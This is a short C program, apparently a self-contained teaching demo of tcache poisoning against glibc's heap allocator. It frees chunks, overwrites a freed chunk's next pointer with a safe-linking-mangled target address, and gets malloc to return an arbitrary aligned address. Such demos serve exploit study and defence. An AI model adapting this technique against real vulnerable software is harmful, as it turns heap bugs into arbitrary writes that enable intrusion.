#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
size_t writable[100];
int main() {
	intptr_t* padding_buf = malloc(128);
	intptr_t* buf = malloc(128);
	printf("old: %p\n", buf);
	free(padding_buf);
	free(buf);
	printf("curr state: %p\n", buf[0]);
	size_t* target = NULL;
	for (int i = 0; i < 100; ++i) {
		//printf("%ul\n", (unsigned long)(&writable[i])&0xf);
		if (((unsigned long)(&writable[i])&0xf)==0) {
			target=&writable[i];
			break;
		}
	}
	printf("new target: %p\n", target);
	//printf("%d\n", (long)target&0xf);
	assert(((long) target & 0xf) == 0);
	buf[0] = (intptr_t)((long) target ^ (long)buf >> 12);
	printf("%p\n", buf[0]);
	intptr_t* tmp = malloc(128);
	intptr_t* new = malloc(128);
	printf("new: %p\n", new);
	assert(new == target);
	printf("it worked\n");
}
